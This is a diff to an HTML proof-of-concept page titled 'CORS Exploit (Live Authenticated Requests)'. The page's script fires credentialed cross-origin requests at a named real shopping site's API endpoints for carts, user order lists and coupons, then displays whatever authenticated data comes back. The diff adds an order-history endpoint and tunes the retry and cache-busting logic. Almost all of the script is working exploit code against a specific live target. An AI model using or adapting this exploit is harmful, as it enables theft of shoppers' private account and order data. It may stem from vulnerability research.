@@ -5,6 +5,7 @@
 <title>CORS Exploit</title>
 
 <style>
+
 body {
     font-family: Arial;
     background: #0f172a;
@@ -24,7 +25,7 @@ button {
 
 .container {
     display: grid;
-    grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+    grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
     gap: 15px;
 }
 
@@ -35,8 +36,13 @@ button {
     box-shadow: 0 0 10px rgba(0,0,0,0.5);
 }
 
-.success { border-left: 5px solid #22c55e; }
-.fail { border-left: 5px solid #ef4444; }
+.success {
+    border-left: 5px solid #22c55e;
+}
+
+.fail {
+    border-left: 5px solid #ef4444;
+}
 
 .loading {
     opacity: 0.6;
@@ -47,9 +53,11 @@ pre {
     word-break: break-word;
     font-size: 12px;
 }
-</style>
 
+</style>
 </head>
+
+
 <body>
 
 <h2>CORS Exploit (Live Authenticated Requests)</h2>
@@ -58,13 +66,15 @@ pre {
 
 <div class="container" id="results"></div>
 
+
 <script>
+
 
 const endpoints = [
 
-"https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list",
-
 "https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
+
+"https://www.opposhop.cn/cn/oapi/orders/web/orders/info/myPage/userLists?orderType=[2,3,4]&currentPage=1&pageSize=5",
 
 "https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
 
@@ -110,24 +120,13 @@ for (let i = 0; i < retries; i++) {
 
 try {
 
-const res = await fetch(url, {
-
-method: "GET",
+const res = await fetch(url + "&t=" + Date.now(), {
 
 credentials: "include",
 
-mode: "cors",
-
-cache: "no-store",
-
-headers: {
-
-"Accept": "application/json"
-
-}
+cache: "no-store"
 
 });
-
 
 
 if (res.status === 200) {
@@ -137,16 +136,11 @@ return res;
 }
 
 
-
 } catch (err) {}
-
-
 
 await sleep(1200);
 
 }
-
-
 
 throw "Failed after retries";
 
@@ -166,20 +160,20 @@ const pre = card.querySelector("pre");
 
 try {
 
-const uniqueUrl = url +
-
-(url.includes("?") ? "&" : "?") +
-
-"t=" + Date.now();
+let finalUrl = url;
 
 
+if (!url.includes("?")) {
 
-const res = await fetchWithRetry(uniqueUrl);
+finalUrl += "?t=" + Date.now();
 
+}
+
+
+const res = await fetchWithRetry(finalUrl);
 
 
 const text = await res.text();
-
 
 
 card.classList.remove("loading");
@@ -187,11 +181,9 @@ card.classList.remove("loading");
 card.classList.add("success");
 
 
-
 statusEl.innerText = res.status;
 
 pre.innerText = text;
-
 
 
 } catch (e) {
@@ -199,7 +191,6 @@ pre.innerText = text;
 card.classList.remove("loading");
 
 card.classList.add("fail");
-
 
 
 statusEl.innerText = "Error";
@@ -217,11 +208,9 @@ async function runExploit() {
 document.getElementById("results").innerHTML = "";
 
 
-
 for (const endpoint of endpoints) {
 
 await fetchData(endpoint);
-
 
 
 await sleep(700);
@@ -230,7 +219,9 @@ await sleep(700);
 
 }
 
+
 </script>
+
 
 </body>
 </html>
